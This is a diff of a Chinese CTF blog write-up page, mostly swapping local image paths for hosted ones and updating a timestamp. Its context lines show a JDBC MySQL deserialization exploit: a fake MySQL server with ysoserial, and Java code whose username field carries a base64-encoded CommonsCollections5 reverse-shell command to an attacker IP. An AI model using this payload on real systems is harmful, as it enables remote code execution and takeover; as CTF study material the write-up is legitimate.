@@ -25,13 +25,13 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309300950278.png">
 <meta property="og:image" content="https://s2.loli.net/2023/09/30/jeYo8it6wLua13x.png">
-<meta property="og:image" content="c:\Users\LIKE\AppData\Roaming\Typora\typora-user-images\image-20230930105125714.png">
-<meta property="og:image" content="c:\Users\LIKE\AppData\Roaming\Typora\typora-user-images\image-20230930105245422.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309301114029.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309301114031.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309301103957.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309301103734.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309301107553.png">
 <meta property="article:published_time" content="2023-09-30T01:32:39.000Z">
-<meta property="article:modified_time" content="2023-09-30T03:09:57.411Z">
+<meta property="article:modified_time" content="2023-09-30T03:17:52.931Z">
 <meta property="article:author" content="leekos">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
@@ -342,11 +342,11 @@
 <h4 id="服务端起恶意mysql服务器"><a href="#服务端起恶意mysql服务器" class="headerlink" title="服务端起恶意mysql服务器"></a>服务端起恶意mysql服务器</h4><p><a target="_blank" rel="noopener" href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p>
 <p>上传到服务器，然后python运行<code>server.py</code>即可</p>
 <p>注意要在同一级目录上传<code>ysoserial-0.0.6-SNAPSHOT-all.jar</code></p>
-<p><img src="C:\Users\LIKE\AppData\Roaming\Typora\typora-user-images\image-20230930105125714.png" srcset="/img/loading.gif" lazyload alt="image-20230930105125714"></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309301114029.png" srcset="/img/loading.gif" lazyload alt="image-20230930105125714"></p>
 <h4 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h4><p>首先编写<code>DatabaseInfo</code></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">DatabaseInfo</span> <span class="hljs-variable">databaseInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatabaseInfo</span>();<br>databaseInfo.setHost(<span class="hljs-string">&quot;vps&quot;</span>);<br>databaseInfo.setPort(<span class="hljs-string">&quot;3366&quot;</span>);<span class="hljs-comment">//恶意mysql服务端端口</span><br><span class="hljs-comment">///bin/bash -i &gt;&amp; /dev/tcp/vps/3366 0&gt;&amp;1   反弹shell监听的端口</span><br>databaseInfo.setUsername(<span class="hljs-string">&quot;yso_CommonsCollections5_bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ3LjExNS4yMjEuMTA1Lzc3ODgQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);<br>databaseInfo.setPassword(<span class="hljs-string">&quot;123&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>);<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\LIKE\AppData\Roaming\Typora\typora-user-images\image-20230930105245422.png" srcset="/img/loading.gif" lazyload alt="image-20230930105245422"></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309301114031.png" srcset="/img/loading.gif" lazyload alt="image-20230930105245422"></p>
 <p>这里需要重点注意username、password的格式</p>
 <p>原来jdbc连接mysql的语句如下：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://&quot;</span> + <span class="hljs-built_in">this</span>.host + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-built_in">this</span>.port + <span class="hljs-string">&quot;/jdbc?user=&quot;</span> + <span class="hljs-built_in">this</span>.username + <span class="hljs-string">&quot;&amp;password=&quot;</span> + <span class="hljs-built_in">this</span>.password + <span class="hljs-string">&quot;&amp;connectTimeout=3000&amp;socketTimeout=6000&quot;</span>;<br></code></pre></td></tr></table></figure>
@@ -618,7 +618,7 @@
     <div class="beian">
   <span>
     <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
-      赣ICP备2022008842号-2
+      赣ICP备2022008842号
     </a>
   </span>
   
